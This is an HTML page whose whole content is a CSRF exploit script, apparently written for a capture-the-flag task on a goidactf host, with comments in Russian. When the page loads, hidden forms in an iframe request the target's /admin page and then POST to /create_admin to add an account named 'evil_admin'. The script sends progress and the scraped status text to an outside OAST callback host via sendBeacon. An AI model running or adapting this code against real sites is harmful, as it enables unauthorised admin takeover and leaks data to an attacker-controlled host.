<!DOCTYPE html>
<html>
<body>
<iframe id="attack" name="attack" style="display:none"></iframe>

<script>
const TARGET = "https://tasks.goidactf.ru:20385";
const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
const ADMIN = "evil_admin";

const log = (d) => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));

// Шаг 1: Открываем страницу /admin в iframe
const form1 = document.createElement('form');
form1.action = TARGET + "/admin";
form1.method = "GET";
form1.target = "attack";
form1.style.display = "none";
document.body.appendChild(form1);

// Шаг 2: Создаем форму для создания админа
const form2 = document.createElement('form');
form2.action = TARGET + "/create_admin";
form2.method = "POST";
form2.target = "attack";
form2.style.display = "none";

const input = document.createElement('input');
input.type = "hidden";
input.name = "new_admin_login";
input.value = ADMIN;
form2.appendChild(input);
document.body.appendChild(form2);

// Запускаем
setTimeout(() => {
    form1.submit();
    log("step1_admin_loaded");
    
    setTimeout(() => {
        form2.submit();
        log("step2_create_admin_submitted");
        
        // Ключевой момент: ждем и пытаемся прочитать статус див
        setTimeout(() => {
            try {
                const iframe = document.getElementById('attack');
                const doc = iframe.contentDocument;
                
                // Ищем div с id="status"
                const statusDiv = doc.getElementById('status');
                if (statusDiv) {
                    const text = statusDiv.textContent || statusDiv.innerText;
                    log("STATUS_DIV_CONTENT: " + text);
                    
                    // Анализируем содержимое
                    if (text.includes('401') || text.includes('MOTHER FUCKER') || text.includes('NOT')) {
                        log("RESULT=401_UNAUTHORIZED");
                    } else if (text.includes('Status: 200') || text.includes('Status:20')) {
                        log("RESULT=200_SUCCESS");
                    } else if (text.includes('Status:')) {
                        const match = text.match(/Status:\s*(\d+)/);
                        log("RESULT=STATUS_" + (match ? match[1] : 'unknown'));
                    }
                } else {
                    log("STATUS_DIV_NOT_FOUND");
                    
                    // Пробуем найти по другим способам
                    const allDivs = doc.getElementsByTagName('div');
                    for (let i = 0; i < allDivs.length; i++) {
                        const divText = allDivs[i].textContent;
                        if (divText.includes('401') || divText.includes('Status:')) {
                            log("FOUND_DIV_" + i + ": " + divText.substring(0, 100));
                        }
                    }
                }
            } catch(e) {
                log("READ_ERROR: " + e.message);
            }
        }, 3000);
    }, 1500);
}, 500);
</script>
</body>
</html>
